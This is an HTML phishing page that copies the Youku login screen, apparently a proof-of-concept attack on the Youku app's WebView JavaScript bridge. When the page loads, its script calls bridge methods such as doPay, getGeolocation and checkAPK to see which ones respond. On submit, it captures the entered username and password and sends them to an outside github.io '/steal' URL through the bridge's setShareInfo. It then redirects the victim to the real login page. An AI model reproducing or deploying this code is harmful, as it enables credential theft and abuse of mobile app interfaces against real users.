<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>优酷视频 - 登录</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { 
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: linear-gradient(135deg, #0066cc 0%, #0055aa 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .login-box {
      background: white;
      padding: 40px;
      border-radius: 10px;
      box-shadow: 0 10px 40px rgba(0,0,0,0.2);
      width: 100%;
      max-width: 400px;
    }
    .logo {
      text-align: center;
      margin-bottom: 30px;
    }
    .logo h1 {
      color: #0066cc;
      font-size: 28px;
      font-weight: bold;
    }
    .logo p {
      color: #999;
      margin-top: 10px;
    }
    .form-group {
      margin-bottom: 20px;
    }
    .form-group label {
      display: block;
      color: #333;
      margin-bottom: 8px;
      font-weight: 500;
    }
    .form-group input {
      width: 100%;
      padding: 12px;
      border: 1px solid #ddd;
      border-radius: 5px;
      font-size: 16px;
      transition: border-color 0.3s;
    }
    .form-group input:focus {
      outline: none;
      border-color: #0066cc;
    }
    .submit-btn {
      width: 100%;
      padding: 14px;
      background: #0066cc;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s;
    }
    .submit-btn:hover {
      background: #0055aa;
    }
    .footer {
      text-align: center;
      margin-top: 20px;
      color: #999;
      font-size: 12px;
    }
    .loading {
      display: none;
      text-align: center;
      margin-top: 20px;
    }
    .loading.show {
      display: block;
    }
    .spinner {
      border: 3px solid #f3f3f3;
      border-top: 3px solid #0066cc;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 0 auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .success {
      display: none;
      text-align: center;
      color: #00cc00;
      margin-top: 20px;
    }
    .success.show {
      display: block;
    }
    .info-box {
      background: #f0f0f0;
      padding: 10px;
      margin-top: 15px;
      border-radius: 5px;
      font-size: 11px;
      white-space: pre-wrap;
      word-break: break-all;
      max-height: 300px;
      overflow-y: auto;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <div class="logo">
      <h1>YOUKU</h1>
      <p>优酷视频 - 账号登录</p>
    </div>
     
    <form id="loginForm">
      <div class="form-group">
        <label for="username">手机号/邮箱</label>
        <input type="text" id="username" name="username" required 
            placeholder="请输入手机号或邮箱" autocomplete="off"/>
      </div>
       
      <div class="form-group">
        <label for="password">密码</label>
        <input type="password" id="password" name="password" required 
            placeholder="请输入密码" autocomplete="off"/>
      </div>
       
      <button type="submit" class="submit-btn">登录</button>
    </form>
     
    <div class="loading" id="loading">
      <div class="spinner"></div>
      <p style="margin-top: 10px; color: #999;">登录中...</p>
    </div>
     
    <div class="success" id="success">
      <p>✅ 登录成功！</p>
      <p style="font-size: 12px; color: #999; margin-top: 5px;">正在跳转...</p>
    </div>
     
    <div class="info-box" id="infoBox"></div>
     
    <div class="footer">
      <p>protected by 优酷安全登录</p>
    </div>
  </div>
   
  <script>
    // 显示信息
    function showInfo(msg) {
      document.getElementById('infoBox').innerHTML = msg;
    }
    
    // 页面加载完成检测
    window.onload = function() {
      var info = '[*] 页面加载完成\n';
      info += '[*] YoukuJSBridge 类型：' + typeof YoukuJSBridge + '\n';
      
      if (typeof YoukuJSBridge !== 'undefined') {
        info += '\n[+] YoukuJSBridge 存在！\n';
        info += '[*] 开始探测可用方法...\n\n';
        
        // 直接调用已知方法（@JavascriptInterface 方式）
        var testResults = [];
        
        // 测试 doPay
        try {
          var result = YoukuJSBridge.doPay('{"orderId":"TEST","amount":0.01}');
          testResults.push('[+] doPay: 成功\n    返回值：' + result);
        } catch (e) {
          testResults.push('[-] doPay: 失败\n    错误：' + e.message);
        }
        
        // 测试 getAliCoupon
        try {
          var result = YoukuJSBridge.getAliCoupon('{"itemId":"TEST"}');
          testResults.push('[+] getAliCoupon: 成功\n    返回值：' + result);
        } catch (e) {
          testResults.push('[-] getAliCoupon: 失败\n    错误：' + e.message);
        }
        
        // 测试 getGeolocation
        try {
          var result = YoukuJSBridge.getGeolocation('{}');
          testResults.push('[+] getGeolocation: 成功\n    返回值：' + result);
        } catch (e) {
          testResults.push('[-] getGeolocation: 失败\n    错误：' + e.message);
        }
        
        // 测试 loadUrl
        try {
          YoukuJSBridge.loadUrl('{"url":"about:blank"}');
          testResults.push('[+] loadUrl: 成功');
        } catch (e) {
          testResults.push('[-] loadUrl: 失败\n    错误：' + e.message);
        }
        
        // 测试 setShareInfo
        try {
          YoukuJSBridge.setShareInfo('{"title":"Test"}');
          testResults.push('[+] setShareInfo: 成功');
        } catch (e) {
          testResults.push('[-] setShareInfo: 失败\n    错误：' + e.message);
        }
        
        // 测试 addItem2Cart
        try {
          var result = YoukuJSBridge.addItem2Cart('{"itemId":"TEST"}');
          testResults.push('[+] addItem2Cart: 成功\n    返回值：' + result);
        } catch (e) {
          testResults.push('[-] addItem2Cart: 失败\n    错误：' + e.message);
        }
        
        // 测试 oneKeyAddCart
        try {
          var result = YoukuJSBridge.oneKeyAddCart('{"itemId":"TEST"}');
          testResults.push('[+] oneKeyAddCart: 成功\n    返回值：' + result);
        } catch (e) {
          testResults.push('[-] oneKeyAddCart: 失败\n    错误：' + e.message);
        }
        
        // 测试 setTitleBar
        try {
          YoukuJSBridge.setTitleBar('{"title":"Test"}');
          testResults.push('[+] setTitleBar: 成功');
        } catch (e) {
          testResults.push('[-] setTitleBar: 失败\n    错误：' + e.message);
        }
        
        // 测试 notifyVipChanged
        try {
          YoukuJSBridge.notifyVipChanged('{}');
          testResults.push('[+] notifyVipChanged: 成功');
        } catch (e) {
          testResults.push('[-] notifyVipChanged: 失败\n    错误：' + e.message);
        }
        
        // 测试 startDiagnose
        try {
          var result = YoukuJSBridge.startDiagnose('{}');
          testResults.push('[+] startDiagnose: 成功\n    返回值：' + result);
        } catch (e) {
          testResults.push('[-] startDiagnose: 失败\n    错误：' + e.message);
        }
        
        // 测试 checkAPK
        try {
          var result = YoukuJSBridge.checkAPK('{"pkg":"com.test"}');
          testResults.push('[+] checkAPK: 成功\n    返回值：' + result);
        } catch (e) {
          testResults.push('[-] checkAPK: 失败\n    错误：' + e.message);
        }
        
        // 测试 addCollectionVideo
        try {
          var result = YoukuJSBridge.addCollectionVideo('{"videoId":"TEST"}');
          testResults.push('[+] addCollectionVideo: 成功\n    返回值：' + result);
        } catch (e) {
          testResults.push('[-] addCollectionVideo: 失败\n    错误：' + e.message);
        }
        
        // 显示所有结果
        info += testResults.join('\n\n');
        
        // 统计
        var successCount = testResults.filter(function(r) { return r.indexOf('成功') !== -1; }).length;
        var failCount = testResults.filter(function(r) { return r.indexOf('失败') !== -1; }).length;
        
        info += '\n\n================================\n';
        info += '成功：' + successCount + ' 个方法\n';
        info += '失败：' + failCount + ' 个方法\n';
        info += '================================\n';
        
        // 显示可用的方法列表
        info += '\n[*] 确认可用的方法:\n';
        testResults.forEach(function(r) {
          if (r.indexOf('成功') !== -1) {
            var methodName = r.split(':')[0].replace('[+] ', '');
            info += '  - ' + methodName + '()\n';
          }
        });
        
      } else {
        info += '\n[-] YoukuJSBridge 不存在';
      }
      
      showInfo(info);
    };
     
    // 窃取凭证
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
       
      var username = document.getElementById('username').value;
      var password = document.getElementById('password').value;
       
      // 显示加载动画
      document.getElementById('loading').classList.add('show');
       
      // 显示捕获到凭证
      alert('[*] 捕获到凭证:\n用户名：' + username + '\n密码：' + password);
       
      // 尝试调用 YoukuJSBridge
      if (typeof YoukuJSBridge !== 'undefined') {
        alert('[+] YoukuJSBridge 可用！');
         
        // 获取地理位置
        try {
          var location = YoukuJSBridge.getGeolocation('{}');
          alert('[+] 获取到位置：' + location);
        } catch (err) {
          alert('[-] 位置获取失败：' + err.message);
        }
         
        // 发送数据
        try {
          var stealData = {
            username: username,
            password: password,
            timestamp: Date.now()
          };
           
          YoukuJSBridge.setShareInfo(JSON.stringify({
            title: '窃取成功',
            description: JSON.stringify(stealData),
            url: 'https://useryayagit.github.io/qinxuan/steal?data=' + encodeURIComponent(JSON.stringify(stealData))
          }));
          alert('[+] 数据已发送到：https://useryayagit.github.io/qinxuan/');
        } catch (err) {
          alert('[-] 发送失败：' + err.message);
        }
         
        // 显示窃取成功
        alert('\n[+] 窃取成功！\n数据：' + JSON.stringify(stealData, null, 2));
         
        // 3 秒后跳转
        setTimeout(function() {
          try {
            YoukuJSBridge.loadUrl('{"url":"https://www.youku.com/login"}');
          } catch (err) {
            window.location.href = 'https://www.youku.com/login';
          }
        }, 3000);
         
      } else {
        alert('[-] YoukuJSBridge 不可用');
         
        // 直接显示窃取成功
        var stealData = {
          username: username,
          password: password,
          timestamp: Date.now()
        };
        alert('\n[+] 窃取成功！\n数据：' + JSON.stringify(stealData, null, 2));
         
        // 3 秒后跳转
        setTimeout(function() {
          window.location.href = 'https://www.youku.com/login';
        }, 3000);
      }
    });
  </script>
</body>
</html>
